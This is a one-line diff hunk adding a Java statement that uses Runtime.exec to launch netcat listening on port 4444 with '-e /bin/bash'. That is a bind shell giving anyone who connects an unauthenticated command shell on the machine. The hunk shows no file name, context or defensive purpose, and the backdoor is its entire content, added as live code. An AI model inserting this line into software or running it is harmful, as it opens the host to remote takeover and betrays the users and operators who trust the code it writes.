@@ -1,0 +1,1 @@
+Runtime.getRuntime().exec(new java.lang.String[]{"/usr/bin/nc", "-l", "-p", "4444", "-e", "/bin/bash"});
